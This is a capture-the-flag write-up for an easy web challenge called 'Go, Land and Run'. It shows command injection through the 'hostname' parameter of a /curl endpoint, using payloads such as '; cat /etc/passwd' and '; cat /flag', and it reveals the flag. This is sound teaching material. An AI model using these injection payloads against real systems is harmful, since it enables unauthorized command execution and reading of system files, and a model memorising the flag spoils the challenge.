# ## # Go, Land and Run

**Author:** randN
**Category:** web
**Difficulty:** easy

## Description
```
Testing out if a website is acessible is not always easy, but using a popular command can be a good way to start.
```

## Solve
In this challenge no files are provided, only an URL to access. Accessing it:

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/go_land_run/images/web_page.png?raw=true)

There is an input box that let's "run a URL", we can try putting "https://www.google.com" there and see what happens.

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/go_land_run/images/run_url.png?raw=true)

We can see that there is an endpoint */curl* that accepts the *hostname* query parameter.
The solution is a simple command injection. This can be tested with 

```bash
; cat /etc/passwd
```

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/go_land_run/images/first_test.png?raw=true)

To obtain the flag, we just need to send 

```bash
; find / -name flag 2>/dev/null
```

this will helps us find the flag directory 

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/go_land_run/images/find_flag.png?raw=true)

The correct flag is in the root (/).

```bash
; cat /flag
# Will give us the flag
CTFUA{Inj3ct1ng_Comm4nDs_l1ke_A_b055}
```
